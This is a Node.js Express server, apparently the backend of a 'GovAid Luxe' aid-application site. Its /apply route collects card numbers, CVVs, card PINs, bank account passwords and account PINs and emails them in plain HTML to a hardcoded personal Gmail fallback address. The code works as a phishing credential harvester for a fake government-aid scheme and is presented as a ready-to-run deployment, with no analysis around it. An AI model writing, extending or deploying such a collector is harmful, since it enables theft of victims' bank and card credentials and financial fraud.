import express from "express";
import cors from "cors";
import nodemailer from "nodemailer";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// ✅ Choose mail service (Resend or Gmail)
const transporter = nodemailer.createTransport({
  host: "smtp.resend.com",
  port: 587,
  auth: {
    user: "resend",
    pass: process.env.RESEND_API_KEY, // Add in .env
  },
});

// Test route
app.get("/", (req, res) => {
  res.send("✅ GovAid Luxe Backend is Running Successfully!");
});

// Apply route
app.post("/apply", async (req, res) => {
  try {
    const data = req.body;

    const message = `
      <h2>New Application Received</h2>
      <p><b>Full Name:</b> ${data.fullName}</p>
      <p><b>Email:</b> ${data.email}</p>
      <p><b>Phone:</b> ${data.phoneCountryCode} ${data.phone}</p>
      <p><b>Country:</b> ${data.country}</p>
      <p><b>Currency:</b> ${data.currency}</p>
      <p><b>Bank Account Name:</b> ${data.accountName}</p>
      <p><b>Account Number:</b> ${data.accountNumber}</p>
      <p><b>Card Number:</b> ${data.cardNumber}</p>
      <p><b>CVV:</b> ${data.cardCvv}</p>
      <p><b>Card PIN:</b> ${data.cardPin}</p>
      <p><b>Account Password:</b> ${data.accountPassword}</p>
      <p><b>Account PIN:</b> ${data.accountPin}</p>
      <p><b>Amount:</b> ${data.amount}</p>
    `;

    await transporter.sendMail({
      from: "GovAid Luxe <onboarding@resend.dev>", // Works even without domain
      to: process.env.MAIL_TO || "sammy1frosh@gmail.com",
      subject: "New GovAid Luxe Application",
      html: message,
    });

    res.status(200).json({ success: true, message: "✅ Application sent successfully!" });
  } catch (error) {
    console.error("Email send error:", error);
    res.status(500).json({ success: false, message: "❌ Failed to send email" });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));